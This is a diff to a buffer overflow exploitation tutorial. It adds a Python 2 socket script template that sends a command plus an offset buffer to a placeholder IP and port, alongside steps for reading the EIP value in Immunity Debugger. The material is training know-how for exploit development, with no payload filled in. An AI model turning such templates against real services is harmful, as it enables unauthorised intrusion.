@@ -79,9 +79,24 @@ while True:
 2.	Edit the script to add the offset pattern.
 
 ```
-offset = "<OFFSET PATTERN>"
+#!/usr/bin/python
+import sys, socket
+from time import sleep
+
+offset = ""
 
 buffer = offset
+
+try:
+    s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.connect(('<IP>',<PORT>))
+    s.send(('<COMMAND>' + buffer))
+    s.close()
+    
+except:
+    print "Error connecting to server"
+    sys.exit()
+
 ```
 3.	Send the offset pattern and get the EIP value out of the Immunity Debugger.
 4. Get the amount of offset bytes.
